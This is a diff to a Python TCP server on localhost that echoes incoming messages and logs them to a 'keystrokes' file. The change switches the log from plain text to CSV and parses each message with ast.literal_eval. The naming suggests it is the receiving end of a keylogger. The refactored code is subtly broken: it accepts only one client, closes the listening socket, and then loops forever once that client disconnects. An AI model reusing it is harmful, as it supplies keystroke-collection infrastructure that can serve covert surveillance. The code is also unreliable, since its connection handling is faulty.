@@ -1,15 +1,17 @@
 import socket
+import csv
+import ast
+from contextlib import closing
 
-sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+with closing(socket.socket(socket.AF_INET, socket.SOCK_STREAM)) as s:
+    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    s.bind((('localhost', 9999)))
+    s.listen(3)
+    client, addr = s.accept()
 
-sock.bind((('localhost', 9999)))
-sock.listen(3)
 
 while True:
-    client, addr = sock.accept()
     print('Connected: ', addr)
-
     while True:
         data = client.recv(1024)
         if not data:
@@ -17,7 +19,7 @@ while True:
         udata = data.decode()
         client.send(udata.encode('utf-8'))
         # save to file
-        with open('keystrokes.txt', 'a') as f:
-            f.write(udata + '\n')
-
-    client.close()
+        udata = ast.literal_eval(udata)
+        with open('keystrokes.csv', 'a', newline='') as csvfile:
+            writer = csv.writer(csvfile)
+            writer.writerow(udata)
